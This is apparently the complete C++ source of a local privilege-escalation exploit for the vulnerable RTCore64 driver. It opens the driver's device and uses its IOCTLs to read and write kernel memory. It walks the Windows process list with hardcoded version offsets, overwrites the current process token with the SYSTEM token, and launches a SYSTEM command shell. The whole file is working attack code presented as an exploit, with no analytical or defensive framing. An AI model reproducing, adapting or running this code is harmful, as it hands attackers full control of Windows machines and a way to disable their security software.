#include "RTCore64.h"

// Logging functions
void Con(const char* Message, ...) {
    const auto file = stderr;

    va_list Args;
    va_start(Args, Message);
    std::vfprintf(file, Message, Args);
    std::fputc('\n', file);
    va_end(Args);
}

void ConError(const char* Message, ...) {
    const auto file = stderr;

    std::fprintf(file, "[ERROR] ");
    
    va_list Args;
    va_start(Args, Message);
    std::vfprintf(file, Message, Args);
    std::fputc('\n', file);
    va_end(Args);
}

void ConSuccess(const char* Message, ...) {
    const auto file = stderr;

    std::fprintf(file, "[SUCCESS] ");
    
    va_list Args;
    va_start(Args, Message);
    std::vfprintf(file, Message, Args);
    std::fputc('\n', file);
    va_end(Args);
}
// Device operations
HANDLE OpenRTCoreDevice() {
    const auto Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (Device == INVALID_HANDLE_VALUE) {
        ConError("Unable to obtain a handle to the RTCore64 device object");
        return INVALID_HANDLE_VALUE;
    }
    ConSuccess("Device object handle has been obtained");
    return Device;
}

void CloseRTCoreDevice(HANDLE Device) {
    if (Device != INVALID_HANDLE_VALUE) {
        CloseHandle(Device);
        Con("[*] RTCore64 device handle closed");
    }
}

// Memory operations

DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    if (Device == INVALID_HANDLE_VALUE) {
        ConError("Invalid device handle for memory read");
        return 0;
    }

    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;

    DWORD BytesReturned;
    BOOL result = DeviceIoControl(Device,
        RTCORE64_MEMORY_READ_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);

    if (!result) {
        ConError("DeviceIoControl failed for memory read at address %p", (void*)Address);
        return 0;
    }

    return MemoryRead.Value;
}

RTCoreResult WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    if (Device == INVALID_HANDLE_VALUE) {
        ConError("Invalid device handle for memory write");
        return RTCoreResult::DeviceHandleError;
    }

    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    DWORD BytesReturned;
    BOOL result = DeviceIoControl(Device,
        RTCORE64_MEMORY_WRITE_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);

    if (!result) {
        ConError("DeviceIoControl failed for memory write at address %p", (void*)Address);
        return RTCoreResult::MemoryWriteError;
    }

    return RTCoreResult::Success;
}

WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 2, Address) & 0xffff;
}

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 4, Address);
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}

RTCoreResult WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    RTCoreResult result1 = WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
    if (result1 != RTCoreResult::Success) {
        return result1;
    }
    
    RTCoreResult result2 = WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
    if (result2 != RTCoreResult::Success) {
        return result2;
    }
    
    return RTCoreResult::Success;
}

// Kernel operations  
unsigned long long GetKernelBaseAddress() {
    DWORD out = 0;
    DWORD nb = 0;
    PVOID* base = NULL;
    
    if (!EnumDeviceDrivers(NULL, 0, &nb)) {
        ConError("Failed to enumerate device drivers for size calculation");
        return 0;
    }
    
    base = (PVOID*)malloc(nb);
    if (!base) {
        ConError("Failed to allocate memory for device driver enumeration");
        return 0;
    }
    
    if (!EnumDeviceDrivers(base, nb, &out)) {
        ConError("Failed to enumerate device drivers");
        free(base);
        return 0;
    }
    
    unsigned long long kernelBase = (unsigned long long)base[0];
    free(base);
    
    if (kernelBase) {
        ConSuccess("Kernel base address obtained: %p", (void*)kernelBase);
    } else {
        ConError("Failed to obtain kernel base address");
    }
    
    return kernelBase;
}

DWORD64 GetPsInitialSystemProcessOffset() {
    // Locating PsInitialSystemProcess offset
    HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    if (!Ntoskrnl) {
        ConError("Failed to load ntoskrnl.exe");
        return 0;
    }

    PROC PsInitialSystemProcessProc = GetProcAddress(Ntoskrnl, "PsInitialSystemProcess");
    if (!PsInitialSystemProcessProc) {
        ConError("Failed to get PsInitialSystemProcess address from ntoskrnl.exe");
        FreeLibrary(Ntoskrnl);
        return 0;
    }

    const DWORD64 PsInitialSystemProcessOffset = reinterpret_cast<DWORD64>(PsInitialSystemProcessProc) - reinterpret_cast<DWORD64>(Ntoskrnl);
    FreeLibrary(Ntoskrnl);
    
    Con("[*] PsInitialSystemProcess offset: 0x%llx", PsInitialSystemProcessOffset);
    
    return PsInitialSystemProcessOffset;
}

// Version and compatibility functions
ProcessOffsets GetVersionOffsets() {
    wchar_t value[255] = { 0x00 };
    DWORD BufferSize = 255;
    
    LSTATUS result = RegGetValue(HKEY_LOCAL_MACHINE, 
                                L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 
                                L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);
    
    if (result != ERROR_SUCCESS) {
        ConError("Failed to read Windows version from registry");
        exit(-1);
    }
    
    wprintf(L"[+] Windows Version %s Found\n", value);
    auto wV = _wtoi(value);
    
    switch (wV) {
    case 1607:
        ConSuccess("Windows 1607 offsets loaded");
        return ProcessOffsets{ 0x02e8, 0x02f0, 0x0358};
    case 1803:
    case 1809:
        ConSuccess("Windows 1803/1809 offsets loaded");
        return ProcessOffsets{ 0x02e0, 0x02e8, 0x0358};
    case 1903:
    case 1909:
        ConSuccess("Windows 1903/1909 offsets loaded");
        return ProcessOffsets{ 0x02e8, 0x02f0, 0x0360};
    case 2004:
    case 2009:
        ConSuccess("Windows 2004/2009 offsets loaded");
        return ProcessOffsets{ 0x0440, 0x0448, 0x04b8};
    default:
        ConError("Version Offsets Not Found for version %d!", wV);
        exit(-1);
    }
}

bool IsCompatibleWindowsVersion() {
    wchar_t value[255] = { 0x00 };
    DWORD BufferSize = 255;
    
    LSTATUS result = RegGetValue(HKEY_LOCAL_MACHINE, 
                                L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 
                                L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);
    
    if (result != ERROR_SUCCESS) {
        return false;
    }
    
    auto wV = _wtoi(value);
    return (wV == 1607 || wV == 1803 || wV == 1809 || wV == 1903 || wV == 1909 || wV == 2004 || wV == 2009);
}

// Process operations
RTCoreResult FindProcessInActiveList(HANDLE Device, DWORD TargetPID, const ProcessOffsets& Offsets, 
                                     DWORD64 SystemProcessAddress, DWORD64* ProcessAddress) {
    if (!ProcessAddress) {
        ConError("Invalid output parameter for process address");
        return RTCoreResult::ProcessNotFound;
    }

    const DWORD64 CurrentProcessId = static_cast<DWORD64>(TargetPID);
    DWORD64 ProcessHead = SystemProcessAddress + Offsets.ActiveProcessLinksOffset;
    DWORD64 CurrentProcessAddress = ProcessHead;
    
    Con("[*] Searching for process PID %d in active process list", TargetPID);

    do {
        const DWORD64 ProcessAddr = CurrentProcessAddress - Offsets.ActiveProcessLinksOffset;
        const auto UniqueProcessId = ReadMemoryDWORD64(Device, ProcessAddr + Offsets.UniqueProcessIdOffset);
        
        Con("[*] Checking process PID: %lld", UniqueProcessId);
        
        if (UniqueProcessId == CurrentProcessId) {
            *ProcessAddress = ProcessAddr;
            ConSuccess("Target process found at address: %p", (void*)ProcessAddr);
            return RTCoreResult::Success;
        }
        
        CurrentProcessAddress = ReadMemoryDWORD64(Device, ProcessAddr + Offsets.ActiveProcessLinksOffset);
    } while (CurrentProcessAddress != ProcessHead);

    ConError("Target process with PID %d not found in active process list", TargetPID);
    return RTCoreResult::ProcessNotFound;
}

RTCoreResult PerformTokenStealing(HANDLE Device, DWORD TargetPID, const ProcessOffsets& Offsets) {
    if (Device == INVALID_HANDLE_VALUE) {
        return RTCoreResult::DeviceHandleError;
    }

    // Get kernel base address
    const auto KernelBaseAddress = GetKernelBaseAddress();
    if (!KernelBaseAddress) {
        return RTCoreResult::KernelAddressError;
    }
    Con("[*] Ntoskrnl base address: %p", (void*)KernelBaseAddress);

    // Get PsInitialSystemProcess address  
    const DWORD64 PsInitialSystemProcessOffset = GetPsInitialSystemProcessOffset();
    if (!PsInitialSystemProcessOffset) {
        ConError("Failed to get PsInitialSystemProcess offset");
        return RTCoreResult::KernelAddressError;
    }
    
    const DWORD64 PsInitialSystemProcessAddress = ReadMemoryDWORD64(Device, KernelBaseAddress + PsInitialSystemProcessOffset);
    if (!PsInitialSystemProcessAddress) {
        ConError("Failed to read PsInitialSystemProcess address");
        return RTCoreResult::KernelAddressError;
    }
    Con("[*] PsInitialSystemProcess address: %p", (void*)PsInitialSystemProcessAddress);

    // Get System process token
    const DWORD64 SystemProcessToken = ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + Offsets.TokenOffset) & ~15;
    Con("[*] System process token: %p", (void*)SystemProcessToken);

    // Find target process
    DWORD64 TargetProcessAddress;
    RTCoreResult result = FindProcessInActiveList(Device, TargetPID, Offsets, PsInitialSystemProcessAddress, &TargetProcessAddress);
    if (result != RTCoreResult::Success) {
        return result;
    }

    // Read current process token
    const DWORD64 CurrentProcessFastToken = ReadMemoryDWORD64(Device, TargetProcessAddress + Offsets.TokenOffset);
    const DWORD64 CurrentProcessTokenReferenceCounter = CurrentProcessFastToken & 15;
    const DWORD64 CurrentProcessToken = CurrentProcessFastToken & ~15;
    Con("[*] Current process token: %p", (void*)CurrentProcessToken);

    // Perform token stealing
    Con("[*] Stealing System process token ...");
    RTCoreResult writeResult = WriteMemoryDWORD64(Device, TargetProcessAddress + Offsets.TokenOffset, 
                                                  CurrentProcessTokenReferenceCounter | SystemProcessToken);
    
    if (writeResult != RTCoreResult::Success) {
        ConError("Failed to write new token to target process");
        return RTCoreResult::TokenManipulationError;
    }

    ConSuccess("Token stealing completed successfully");
    return RTCoreResult::Success;
}

RTCoreResult SpawnSystemShell() {
    Con("[*] Spawning new SYSTEM shell ...");

    STARTUPINFOW StartupInfo{};
    StartupInfo.cb = sizeof(StartupInfo);
    PROCESS_INFORMATION ProcessInformation;

    BOOL result = CreateProcessW(LR"(C:\Windows\System32\cmd.exe)",
        nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr,
        &StartupInfo,
        &ProcessInformation);

    if (!result) {
        ConError("Failed to create SYSTEM shell process");
        return RTCoreResult::ProcessNotFound;
    }

    ConSuccess("SYSTEM shell spawned successfully");

    // Wait for the process to complete
    WaitForSingleObject(ProcessInformation.hProcess, INFINITE);
    CloseHandle(ProcessInformation.hThread);
    CloseHandle(ProcessInformation.hProcess);
    
    return RTCoreResult::Success;
}

// Main exploitation function
RTCoreResult ExploitRTCore64(DWORD TargetPID) {
    Con("[*] Starting RTCore64 exploitation...");
    
    // Use current process ID if none specified
    if (TargetPID == 0) {
        TargetPID = GetCurrentProcessId();
        Con("[*] Using current process PID: %d", TargetPID);
    }

    // Check Windows version compatibility
    if (!IsCompatibleWindowsVersion()) {
        ConError("Unsupported Windows version");
        return RTCoreResult::VersionNotSupported;
    }

    // Get version-specific offsets
    ProcessOffsets offsets = GetVersionOffsets();
    Con("[*] Process offsets - UniqueProcessId: 0x%llx, ActiveProcessLinks: 0x%llx, Token: 0x%llx", 
        offsets.UniqueProcessIdOffset, offsets.ActiveProcessLinksOffset, offsets.TokenOffset);

    // Open RTCore64 device
    HANDLE Device = OpenRTCoreDevice();
    if (Device == INVALID_HANDLE_VALUE) {
        return RTCoreResult::DeviceHandleError;
    }

    // Perform token stealing
    RTCoreResult result = PerformTokenStealing(Device, TargetPID, offsets);
    
    // Clean up
    CloseRTCoreDevice(Device);

    if (result != RTCoreResult::Success) {
        ConError("Token stealing failed with result code: %d", (int)result);
        return result;
    }

    // Spawn SYSTEM shell
    return SpawnSystemShell();
}


int main()
{
    ConSuccess("RTCore64 Exploit Starting...");
    
    RTCoreResult result = ExploitRTCore64(GetCurrentProcessId());
    
    if (result == RTCoreResult::Success) {
        ConSuccess("Exploitation completed successfully!");
        return 0;
    } else {
        ConError("Exploitation failed with error code: %d", (int)result);
        return -1;
    }
}